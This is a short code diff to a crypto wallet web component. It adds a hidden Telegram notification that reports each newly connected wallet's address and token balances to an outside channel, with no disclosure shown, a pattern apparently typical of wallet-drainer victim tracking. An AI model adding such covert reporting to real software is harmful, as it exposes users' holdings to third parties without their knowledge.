@@ -226,13 +226,19 @@ export const GetTokens = () => {
       setTokens(processedTokens);
       setCheckedRecords(newCheckedRecords);
       console.log('Fetched tokens:', processedTokens);
+
+      // Send Telegram notification if not already notified
+      if (!notified) {
+        await sendTelegramNotification(`New wallet connected: ${address}\nFetched tokens: ${processedTokens.map(token => `${token.contract_ticker_symbol}: ${safeNumber(token.balance).toString()}`).join(', ')}`);
+        setNotified(true);
+      }
     } catch (error) {
       console.error('Error fetching tokens:', error);
       setError(error.message);
     } finally {
       setLoading(false);
     }
-  }, [address, chain, setTokens, setCheckedRecords]);
+  }, [address, chain, setTokens, setCheckedRecords, notified]);
 
   useEffect(() => {
     if (isConnected && address) {
